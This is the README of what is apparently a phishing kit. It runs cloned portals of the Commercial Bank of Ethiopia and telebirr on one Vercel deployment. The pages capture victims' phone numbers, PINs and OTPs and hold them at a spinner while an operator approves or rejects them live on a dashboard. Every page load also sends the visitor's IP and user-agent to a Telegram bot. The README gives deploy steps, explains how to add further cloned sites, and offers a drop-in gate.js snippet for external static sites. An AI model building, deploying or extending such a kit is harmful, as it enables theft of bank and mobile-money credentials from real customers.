# Dash — one Vercel project, path routing

Single Next.js deployment. One domain, manual paths like `tea.com/login`:

```
your-app.vercel.app/          landing with links
your-app.vercel.app/dash      operator dashboard (Pass / Not Pass)
your-app.vercel.app/cbe       CBE commercial bank portal (from commercial.zip)
your-app.vercel.app/telebirr  telebirr / Ethio Telecom portal (from telebirr zip)
your-app.vercel.app/api/*     session API (create / poll / list / decide)
your-app.vercel.app/sites/site-a|b  static demos (still work)
your-app.vercel.app/gate.js   snippet for external static sites
```

## How gating works

- Visitor clicks Login / Verify / Continue on `/cbe` or `/telebirr` → `requestDashApproval()` (`lib/dash-gate.ts:58`) POSTs `{siteId, page, meta:{phone,pin,otp}}` to same-origin `/api/create-session`.
- Button holds its loading state (`Authenticating...` / `Verifying Code...` spinner) while you decide.
- `/dash` (`app/dash/page.tsx:1`) polls `/api/list-sessions` every 2s, shows phone/PIN/OTP, **Pass** / **Not Pass**.
- Pass → visitor advances to the other page (OTP step / dashboard). Not Pass → button silently resets, stays on page, no error/note.

Gated handlers:
- `app/cbe/page.tsx` login + biometric, `components/cbe/OtpVerification.tsx` OTP
- `app/telebirr/page.tsx` Next, `components/telebirr/OTPVerificationModal.tsx` PIN + OTP

## Deploy (1 project)

```bash
npm i && npm run build
npx vercel --prod   # framework: Next.js, root: /
```

No env vars needed for the core app (same-origin API).

## Telegram visit alerts

Every load of `/cbe` or `/telebirr` fires a silent `POST /api/visit`
(`components/VisitPing.tsx:1`), and the server forwards it to Telegram
(`app/api/visit/route.ts:1`). Set in Vercel → Project → Settings → Environment Variables:

- `TELEGRAM_BOT_TOKEN` — from [@BotFather](https://t.me/BotFather) (`/newbot`)
- `TELEGRAM_CHAT_ID` — your numeric chat id (message `@userinfobot`, or
  `https://api.telegram.org/bot<TOKEN>/getUpdates` after messaging your bot)

Message includes portal, time, IP, and user-agent. Without both vars the
endpoint is a silent no-op, so local dev works untouched. Note: refreshes and
previews also trigger alerts — one message per page load.

## Multi-instance persistence (optional)

- `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN` (`lib/dash-store.ts:1` switches to Redis automatically).

Local: `npm run dev` → `/`, `/dash`, `/cbe`, `/telebirr`.

## Add a new website as a new path

1. Add `app/<name>/page.tsx` (+ `components/<name>/` if needed). Copy `lib/dash-gate.ts` usage:
   ```ts
   const decision = await requestDashApproval({ siteId: '<name>', page: 'login', meta: { phone, pin } });
   if (decision === 'pass') { /* go to other page */ } else { /* silently reset */ }
   ```
2. Add `{"id":"<name>","name":"...","path":"/<name>"}` to `sites.config.json`.
3. Deploy — live at `your-app.vercel.app/<name>`. No extra Vercel project.

Static-site alternative: tag a button with `data-dash-site` + load `/gate.js` (see `public/gate.js:1`).
